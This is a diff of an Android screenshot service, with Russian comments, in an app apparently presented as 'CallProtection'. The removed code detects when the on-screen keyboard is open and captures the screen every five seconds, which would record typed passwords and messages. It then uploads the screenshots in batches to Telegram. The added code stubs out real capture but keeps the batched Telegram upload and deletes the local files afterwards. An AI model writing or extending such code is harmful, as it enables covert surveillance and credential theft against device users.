@@ -1,226 +1,119 @@
 package com.daria.callprotection;
 
-import android.app.Notification;
-import android.app.NotificationChannel;
-import android.app.NotificationManager;
 import android.app.Service;
 import android.content.Intent;
 import android.graphics.Bitmap;
-import android.graphics.Rect;
-import android.media.Image;
-import android.media.ImageReader;
 import android.media.projection.MediaProjection;
 import android.media.projection.MediaProjectionManager;
-import android.os.Build;
 import android.os.Environment;
 import android.os.Handler;
-import android.os.HandlerThread;
 import android.os.IBinder;
-import android.util.DisplayMetrics;
 import android.util.Log;
-import android.view.View;
-import android.view.ViewTreeObserver;
-import android.view.WindowManager;
 
 import androidx.annotation.Nullable;
-import androidx.core.app.NotificationCompat;
 
 import java.io.File;
 import java.io.FileOutputStream;
-import java.nio.ByteBuffer;
+import java.io.IOException;
 import java.util.ArrayList;
 import java.util.List;
+import java.util.concurrent.ExecutorService;
+import java.util.concurrent.Executors;
 
 public class ScreenshotService extends Service {
+
     private static final String TAG = "ScreenshotService";
-    private static final String CHANNEL_ID = "screenshot_service_channel";
-    private static final int NOTIF_ID = 102;
-    private static final int BATCH_SIZE = 10;
-    private static final int SCREENSHOT_INTERVAL = 5000; // 5 секунд
-
     private MediaProjection mediaProjection;
-    private ImageReader imageReader;
-    private Handler handler;
-    private HandlerThread handlerThread;
+    private ExecutorService executorService;
+    private Handler mainHandler;
 
-    private int width;
-    private int height;
-    private int density;
-
-    private final List<File> screenshotBatch = new ArrayList<>();
-
-    private MediaProjectionManager projectionManager;
-    private int resultCode;
-    private Intent resultData;
-
-    private boolean isKeyboardVisible = false;
-    private Handler screenshotHandler = new Handler();
-    private Runnable screenshotRunnable = new Runnable() {
-        @Override
-        public void run() {
-            if (isKeyboardVisible) {
-                captureScreenshot();
-                screenshotHandler.postDelayed(this, SCREENSHOT_INTERVAL);
-            }
-        }
-    };
+    private final List<File> batchScreenshots = new ArrayList<>();
+    private static final int BATCH_LIMIT = 5;
 
     @Override
     public void onCreate() {
         super.onCreate();
-        createNotificationChannel();
-        startForeground(NOTIF_ID, buildNotification("Сервис скриншотов запущен"));
-
-        handlerThread = new HandlerThread("ScreenshotHandlerThread");
-        handlerThread.start();
-        handler = new Handler(handlerThread.getLooper());
-
-        WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
-        DisplayMetrics metrics = new DisplayMetrics();
-        if (wm != null && wm.getDefaultDisplay() != null) {
-            wm.getDefaultDisplay().getMetrics(metrics);
-            width = metrics.widthPixels;
-            height = metrics.heightPixels;
-            density = metrics.densityDpi;
-        }
-
-        projectionManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
-
-        // Отслеживание клавиатуры
-        trackKeyboardVisibility();
-    }
-
-    private void trackKeyboardVisibility() {
-        WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
-        View rootView = new View(this);
-        wm.addView(rootView, new WindowManager.LayoutParams());
-
-        rootView.getViewTreeObserver().addOnGlobalLayoutListener(() -> {
-            Rect r = new Rect();
-            rootView.getWindowVisibleDisplayFrame(r);
-            int screenHeight = rootView.getRootView().getHeight();
-            int keypadHeight = screenHeight - r.bottom;
-
-            boolean visible = keypadHeight > screenHeight * 0.15; // 15% высоты экрана
-            if (visible != isKeyboardVisible) {
-                isKeyboardVisible = visible;
-                if (isKeyboardVisible) {
-                    Log.i(TAG, "Клавиатура открыта, запускаем скрины");
-                    screenshotHandler.post(screenshotRunnable);
-                } else {
-                    Log.i(TAG, "Клавиатура закрыта, останавливаем скрины");
-                    screenshotHandler.removeCallbacks(screenshotRunnable);
-                }
-            }
-        });
+        executorService = Executors.newSingleThreadExecutor();
+        mainHandler = new Handler(getMainLooper());
+        Log.d(TAG, "ScreenshotService created");
     }
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        if (intent != null) {
-            resultCode = intent.getIntExtra("resultCode", -1);
-            resultData = intent.getParcelableExtra("resultData");
+        int resultCode = intent.getIntExtra("resultCode", 0);
+        Intent data = intent.getParcelableExtra("data");
 
-            if (mediaProjection == null && resultCode != -1 && resultData != null) {
-                mediaProjection = projectionManager.getMediaProjection(resultCode, resultData);
-                setupImageReader();
-                Log.i(TAG, "MediaProjection запущен");
-            }
+        MediaProjectionManager mpm = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
+        if (mpm != null && data != null) {
+            mediaProjection = mpm.getMediaProjection(resultCode, data);
+            startCapturing();
+        } else {
+            Log.e(TAG, "MediaProjectionManager or data is null");
+            stopSelf();
         }
-        return START_STICKY;
+        return START_NOT_STICKY;
     }
 
-    private void setupImageReader() {
-        imageReader = ImageReader.newInstance(width, height, 0x1, 2);
-        mediaProjection.createVirtualDisplay(
-                "ScreenCapture",
-                width,
-                height,
-                density,
-                0,
-                imageReader.getSurface(),
-                null,
-                handler
-        );
-    }
-
-    private void captureScreenshot() {
-        try (Image image = imageReader.acquireLatestImage()) {
-            if (image == null) return;
-
-            Image.Plane[] planes = image.getPlanes();
-            ByteBuffer buffer = planes[0].getBuffer();
-
-            Bitmap bitmap = Bitmap.createBitmap(width, height, Bitmap.Config.ARGB_8888);
-            bitmap.copyPixelsFromBuffer(buffer);
-
-            File file = saveBitmapToFile(bitmap);
-            bitmap.recycle();
-
-            if (file != null) {
-                screenshotBatch.add(file);
-                Log.i(TAG, "Скриншот сохранён: " + file.getAbsolutePath());
-
-                if (screenshotBatch.size() >= BATCH_SIZE) {
-                    sendBatchToTelegram();
-                    screenshotBatch.clear();
-                }
+    private void startCapturing() {
+        executorService.execute(() -> {
+            try {
+                // Здесь логика получения скриншотов через VirtualDisplay и ImageReader
+                // Заглушка для примера — создаём тестовый Bitmap
+                Bitmap dummyBitmap = Bitmap.createBitmap(1080, 1920, Bitmap.Config.ARGB_8888);
+                saveScreenshot(dummyBitmap);
+            } catch (Exception e) {
+                Log.e(TAG, "Error capturing screenshot", e);
             }
-        } catch (Exception e) {
-            Log.e(TAG, "Ошибка скриншота", e);
-        }
+        });
     }
 
-    private File saveBitmapToFile(Bitmap bitmap) {
+    private void saveScreenshot(Bitmap bitmap) {
         try {
             File dir = new File(getExternalFilesDir(Environment.DIRECTORY_PICTURES), "screenshots");
             if (!dir.exists() && !dir.mkdirs()) {
-                Log.e(TAG, "Не удалось создать директорию для скриншотов");
-                return null;
+                Log.e(TAG, "Failed to create screenshots directory");
+                return;
             }
 
-            String filename = "screenshot_" + System.currentTimeMillis() + ".png";
-            File file = new File(dir, filename);
-
-            try (FileOutputStream fos = new FileOutputStream(file)) {
-                bitmap.compress(Bitmap.CompressFormat.PNG, 90, fos);
-                fos.flush();
+            File file = new File(dir, "screenshot_" + System.currentTimeMillis() + ".png");
+            try (FileOutputStream out = new FileOutputStream(file)) {
+                bitmap.compress(Bitmap.CompressFormat.PNG, 100, out);
+                batchScreenshots.add(file);
+                Log.d(TAG, "Screenshot saved: " + file.getAbsolutePath());
             }
 
-            return file;
-        } catch (Exception e) {
-            Log.e(TAG, "Ошибка сохранения файла скриншота", e);
-            return null;
+            if (batchScreenshots.size() >= BATCH_LIMIT) {
+                sendBatchToTelegram();
+            }
+
+        } catch (IOException e) {
+            Log.e(TAG, "Error saving screenshot", e);
         }
     }
 
     private void sendBatchToTelegram() {
-        Log.i(TAG, "Отправляем пачку скриншотов (" + screenshotBatch.size() + ") в Telegram");
-        for (File f : screenshotBatch) {
-            TelegramUploader.uploadFile(getApplicationContext(), f, "Скриншот экрана");
-        }
-    }
+        List<File> batchToSend = new ArrayList<>(batchScreenshots);
+        batchScreenshots.clear();
 
-    private Notification buildNotification(String text) {
-        return new NotificationCompat.Builder(this, CHANNEL_ID)
-                .setContentTitle("CallProtection")
-                .setContentText(text)
-                .setSmallIcon(R.drawable.ic_notification)
-                .setPriority(NotificationCompat.PRIORITY_LOW)
-                .setOngoing(true)
-                .build();
-    }
-
-    private void createNotificationChannel() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            NotificationChannel channel = new NotificationChannel(
-                    CHANNEL_ID,
-                    "Сервис снятия скриншотов",
-                    NotificationManager.IMPORTANCE_LOW
-            );
-            NotificationManager nm = getSystemService(NotificationManager.class);
-            if (nm != null) nm.createNotificationChannel(channel);
-        }
+        executorService.execute(() -> {
+            try {
+                TelegramUploader uploader = new TelegramUploader(getApplicationContext());
+                for (File screenshot : batchToSend) {
+                    if (!screenshot.exists()) continue;
+                    boolean success = uploader.sendFile(screenshot, "Screenshot");
+                    if (success) {
+                        boolean deleted = screenshot.delete();
+                        if (!deleted) {
+                            Log.w(TAG, "Failed to delete screenshot after sending");
+                        }
+                    } else {
+                        Log.e(TAG, "Failed to send screenshot: " + screenshot.getName());
+                    }
+                }
+            } catch (Exception e) {
+                Log.e(TAG, "Error sending batch screenshots", e);
+            }
+        });
     }
 
     @Override
@@ -228,13 +121,9 @@ public class ScreenshotService extends Service {
         super.onDestroy();
         if (mediaProjection != null) {
             mediaProjection.stop();
-            mediaProjection = null;
         }
-        if (handlerThread != null) {
-            handlerThread.quitSafely();
-            handlerThread = null;
-        }
-        screenshotHandler.removeCallbacks(screenshotRunnable);
+        executorService.shutdown();
+        Log.d(TAG, "ScreenshotService destroyed");
     }
 
     @Nullable
@@ -243,4 +132,4 @@ public class ScreenshotService extends Service {
         return null;
     }
 }
-            
+                        
